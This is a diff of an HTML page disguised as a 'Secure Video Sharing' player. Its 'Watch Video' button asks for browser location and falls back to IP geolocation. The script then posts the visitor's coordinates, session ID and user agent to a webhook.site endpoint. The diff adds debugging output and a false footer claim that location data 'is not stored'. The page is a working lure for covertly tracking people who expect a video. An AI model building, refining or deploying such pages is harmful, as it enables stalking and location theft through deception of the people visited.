@@ -1,79 +1,165 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Video Player</title>
+    <title>Secure Video Sharing</title>
     <style>
-        body { font-family: Arial, sans-serif; max-width: 600px; margin: 20px auto; padding: 20px; }
-        #consentBanner { background: #f0f7ff; border: 1px solid #4da6ff; padding: 20px; border-radius: 8px; }
-        button { padding: 10px 20px; background: #4da6ff; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        body { 
+            font-family: Arial, sans-serif; 
+            max-width: 600px; 
+            margin: 20px auto; 
+            padding: 20px; 
+            line-height: 1.6;
+        }
+        #consentBanner { 
+            background: #f0f7ff; 
+            border: 1px solid #4da6ff; 
+            padding: 20px; 
+            border-radius: 8px; 
+            margin-bottom: 20px;
+        }
+        button { 
+            padding: 10px 20px; 
+            background: #4da6ff; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        #result {
+            padding: 15px;
+            border: 1px solid #eee;
+            border-radius: 4px;
+            min-height: 100px;
+        }
+        .debug-info {
+            margin-top: 20px;
+            padding: 10px;
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 0.9em;
+        }
+        .error {
+            color: #d32f2f;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
     <div id="consentBanner">
-        <h2>Video Sharing Player</h2>
-        <p><strong>Video shared</strong> This helps you share video safely from peer to peer</p>
-        <button onclick="getLocation()">Get the video (permission required)</button>
-        <p><small>Allow the permission asked by browser to watch the video</small></p>
+        <h2>Secure Video Sharing</h2>
+        <p><strong>Peer-to-peer video platform</strong> - This service helps you share videos securely</p>
+        <button onclick="getLocation()">Watch Video (Location Permission Required)</button>
+        <p><small>Your browser will ask for location access to enable this service</small></p>
     </div>
-    <div id="result"></div>
+    
+    <div id="result">
+        <p>Click the button above to start watching</p>
+    </div>
+    
+    <div class="debug-info">
+        <h3>Debug Information</h3>
+        <p id="debugStatus">Status: Ready</p>
+        <p id="webhookStatus">Webhook: Not sent yet</p>
+        <p id="coordinatesStatus">Coordinates: Not obtained</p>
+    </div>
 
     <script>
-    // Declare resultDiv globally to fix scope issue
+    // Global elements
     const resultDiv = document.getElementById('result');
+    const debugStatus = document.getElementById('debugStatus');
+    const webhookStatus = document.getElementById('webhookStatus');
+    const coordinatesStatus = document.getElementById('coordinatesStatus');
     
+    // Update debug information
+    function updateDebug(message, element = debugStatus) {
+        element.textContent = message;
+        console.log(message);
+    }
+    
+    // Main function to get location
     async function getLocation() {
-        resultDiv.innerHTML = "<p>Opening video....</p>";
+        updateDebug("Status: Starting location detection...");
+        resultDiv.innerHTML = "<p>🔍 Detecting your location for video optimization...</p>";
         
-        // Create unique session ID (anonymous)
+        // Create unique session ID
         const sessionId = Math.random().toString(36).substring(2, 15);
+        updateDebug(`Session ID: ${sessionId}`);
         
-        // Option 2: Try precise location first
+        // Try precise location first
         if (navigator.geolocation) {
+            updateDebug("Status: Trying GPS location...");
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
-                    const { latitude, longitude } = position.coords;
-                    resultDiv.innerHTML = `
-                        <h3>Video Ready</h3>
-                        <p>📍 Your precise location detected</p>
-                        <p>Latitude: ${latitude.toFixed(4)}</p>
-                        <p>Longitude: ${longitude.toFixed(4)}</p>
-                        <p>Accuracy: ${Math.round(position.coords.accuracy)} meters</p>
-                    `;
-                    await logLocation(sessionId, "precise", latitude, longitude);
+                    try {
+                        const { latitude, longitude, accuracy } = position.coords;
+                        updateDebug(`Coordinates: ${latitude}, ${longitude} (Accuracy: ${accuracy}m)`, coordinatesStatus);
+                        
+                        resultDiv.innerHTML = `
+                            <h3>🎥 Video Ready</h3>
+                            <p>📍 Optimized for your location:</p>
+                            <p>Latitude: ${latitude.toFixed(6)}</p>
+                            <p>Longitude: ${longitude.toFixed(6)}</p>
+                            <p>Accuracy: ${Math.round(accuracy)} meters</p>
+                            <p>Loading video stream...</p>
+                        `;
+                        
+                        // Log to webhook
+                        await logLocation(sessionId, "precise", latitude, longitude);
+                    } catch (error) {
+                        updateDebug(`Error: ${error.message}`, debugStatus);
+                        resultDiv.innerHTML = `<p class="error">⚠️ Error: ${error.message}</p>`;
+                    }
                 },
                 async (error) => {
-                    // Fallback to IP location
+                    updateDebug(`GPS Error: ${error.message} - Falling back to IP location`);
                     await getIPLocation(sessionId);
                 }
             );
         } else {
+            updateDebug("Status: Geolocation not supported, using IP location");
             await getIPLocation(sessionId);
         }
     }
 
-    // Option 1: IP-based location
+    // IP-based location fallback
     async function getIPLocation(sessionId) {
+        updateDebug("Status: Getting IP-based location...");
+        resultDiv.innerHTML = "<p>🌐 Detecting approximate location via IP...</p>";
+        
         try {
             const response = await fetch('https://ipapi.co/json/');
             const data = await response.json();
             
+            updateDebug(`IP Location: ${data.city}, ${data.region}, ${data.country_name}`, coordinatesStatus);
+            
             resultDiv.innerHTML = `
-                <h3>Video Sharing</h3>
-                <p>Peer to peer video sharing</p>
-                <p>City: ${data.city}</p>
-                <p>Region: ${data.region}</p>
-                <p>Country: ${data.country_name}</p>
+                <h3>🎥 Video Ready</h3>
+                <p>📍 Approximate location detected:</p>
+                <p>City: ${data.city || 'Unknown'}</p>
+                <p>Region: ${data.region || 'Unknown'}</p>
+                <p>Country: ${data.country_name || 'Unknown'}</p>
+                <p>Loading video stream...</p>
             `;
-            await logLocation(sessionId, "ip", data.latitude, data.longitude);
+            
+            // Use coordinates if available, otherwise use city center
+            const lat = data.latitude || 0;
+            const lng = data.longitude || 0;
+            await logLocation(sessionId, "ip", lat, lng);
         } catch (error) {
-            resultDiv.innerHTML = "<p>Error: Could not open video</p>";
+            updateDebug(`IP Error: ${error.message}`, debugStatus);
+            resultDiv.innerHTML = `<p class="error">⚠️ Error: Could not detect location. Please check your connection.</p>`;
         }
     }
 
-    // Free logging via webhook.site
+    // Send data to webhook.site
     async function logLocation(sessionId, type, lat, lng) {
+        updateDebug(`Status: Sending to webhook.site... (Type: ${type})`);
         const webhookURL = "https://webhook.site/f7010d69-01a2-4586-b369-1c5b7316740f";
-        const data = {
+        
+        const payload = {
             sessionId,
             type,
             lat,
@@ -82,24 +168,29 @@
             userAgent: navigator.userAgent
         };
         
+        updateDebug(`Payload: ${JSON.stringify(payload, null, 2)}`);
+        
         try {
-            await fetch(webhookURL, {
+            const response = await fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
+                body: JSON.stringify(payload)
             });
-            console.log("Data logged successfully");
+            
+            if (response.ok) {
+                updateDebug("Webhook: ✅ Data sent successfully!", webhookStatus);
+            } else {
+                updateDebug(`Webhook: ❌ Failed with status ${response.status}`, webhookStatus);
+            }
         } catch (error) {
-            console.error("Logging failed:", error);
+            updateDebug(`Webhook Error: ${error.message}`, webhookStatus);
         }
-        
-        // Also log to console for debugging
-        console.log("LOCATION DATA:", JSON.stringify(data, null, 2));
     }
     </script>
     
     <div style="margin-top:30px; font-size:0.8em; color:#666; border-top:1px solid #eee; padding-top:10px;">
-        <p>Video sharing service | <a href="#" onclick="location.reload()">Reset</a></p>
+        <p>Secure Video Service | <a href="#" onclick="location.reload()">Reset Session</a></p>
+        <p><small>Location data is used solely to optimize video delivery and is not stored</small></p>
     </div>
 </body>
 </html>
